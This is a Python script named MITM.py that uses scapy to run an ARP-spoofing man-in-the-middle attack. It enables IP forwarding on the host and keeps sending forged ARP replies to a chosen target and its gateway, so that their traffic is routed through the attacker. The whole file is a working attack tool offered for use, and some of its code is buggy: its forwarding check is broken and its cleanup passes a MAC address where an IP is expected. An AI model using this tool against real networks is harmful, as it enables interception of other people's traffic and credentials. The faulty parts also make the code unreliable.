import scapy.all as sc
import optparse
import time

usage = """
'USAGE'
----------------------------------------------------------------------------
python3 MITM.py -t <target ip> -g <gateway ip>
python3 MITM.py --target <target ip> --gateway <gateway ip>
----------------------------------------------------------------------------
"""
print(usage)

def ip_forwarding():
	with open("/proc/sys/net/ipv4/ip_forward", "r+") as change_file:
		if change_file == 1:
			print("[!] ip_forward file is OK!")
		else:
			change_file.write("1")
			print("[!] Your ip_forward file has been replaced with '1'.\n[!] Check it: cat /proc/sys/net/ipv4/ip_forward")

def get_mac_address(ip):
    arp_pack = sc.ARP(pdst=ip)
    broadcast_pack = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_pack = broadcast_pack/arp_pack
    answered_list = sc.srp(combined_pack,timeout=1, verbose = False)[0]
    return answered_list[0][1].hwsrc
    answered_list.summary()

def arp_poisoing(ip1, ip2):
	ip1_mac = get_mac_address(ip1)
	arp_response = sc.ARP(op = 2, pdst = ip1, hwdst = ip1_mac, psrc = ip2)
	sc.send(arp_response, verbose = False)

def reset_operation(fooled_ip, gateway_ip):
	fooled_mac = get_mac_address(fooled_ip)
	gateway_mac = get_mac_address(gateway_ip)
	arp_response = sc.ARP(op = 2, pdst = fooled_ip, hwdst = fooled_mac, psrc = gateway_mac)
	sc.send(arp_response, verbose = False, count = 4)

def get_user_input():
	obj = optparse.OptionParser()
	obj.add_option("-t", "--target", dest = "target_ip", help = "Enter the target IP")
	obj.add_option("-g", "--gateway", dest = "gateway_ip", help = "Enter the gateway IP")
	options = obj.parse_args()[0]
	
	if not options.target_ip or not options.gateway_ip:
		print("[!] Please follow the usage\n")

	return options

num = 0

ip_forwarding()
usr_ip = get_user_input()
usr_target_ip = usr_ip.target_ip
usr_gateway_ip = usr_ip.gateway_ip

try:
	while True:
		arp_poisoing(usr_target_ip, usr_gateway_ip)
		arp_poisoing(usr_gateway_ip, usr_target_ip)
		num += 2
		print("\r[*] Sending packets..." + str(num), end="")
		time.sleep(3)
except KeyboardInterrupt:
	print("\nQuitting")
	reset_operation(usr_target_ip, usr_gateway_ip)
	reset_operation(usr_gateway_ip, usr_target_ip)
